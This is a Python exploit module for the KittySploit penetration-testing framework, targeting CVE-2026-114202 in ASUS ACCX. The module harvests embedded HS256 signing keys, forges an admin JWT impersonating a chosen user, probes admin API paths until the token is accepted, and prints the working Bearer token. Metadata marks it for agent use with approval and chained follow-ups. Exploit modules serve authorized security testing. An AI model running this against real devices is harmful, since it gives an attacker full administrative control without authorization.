#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-114202 — Forge HS256 admin JWT for ASUS ACCX."""

from kittysploit import *
from lib.protocols.http.asus_accx import Asus_accx
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Asus_accx):
    __info__ = {
        "name": "ASUS ACCX CVE-2026-114202 JWT forge",
        "description": "Discovers embedded signing key and probes admin API with forged Bearer token.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-114202"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-114202"],
        "tags": ["asus", "jwt", "accx", "cve-2026-114202", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["admin_token", "auth_bypass"],
            "chain": {
                "suggested_followups": ["scanner/http/asus_accx_cve_2026_114202_detect"],
            },
        },
    }

    port = OptPort(8080, "HTTPS management port", required=False)
    jwt_key = OptString("", "Known HS256 signing key (skip discovery if set)", required=False)
    impersonate_user = OptString("admin", "Username claim for forged JWT", required=False)
    discover_keys = OptBool(True, "Harvest key candidates from static bundles", required=False)

    def run(self):
        keys = []
        manual = str(self.jwt_key or "").strip()
        if manual:
            keys.append(manual)
        else:
            flag = getattr(self, "discover_keys", True)
            if hasattr(flag, "value"):
                flag = flag.value
            if flag not in (False, "false", "0", 0):
                keys.extend(self.accx_harvest_keys())
        if not keys:
            print_error("No JWT signing key — set jwt_key or enable discover_keys")
            return False
        user = str(self.impersonate_user or "admin")
        hit = self.accx_forge_admin_token(keys, user=user)
        if not hit:
            print_error("No admin API accepted a forged token")
            return False
        token, path, key = hit
        print_success(f"Forged JWT accepted on {path}")
        print_status(f"Key prefix: {key[:24]}...")
        print_status(f"Bearer: {token[:80]}...")
        self.set_info(
            severity="critical",
            cve="CVE-2026-114202",
            admin_path=path,
            token=token,
        )
        return True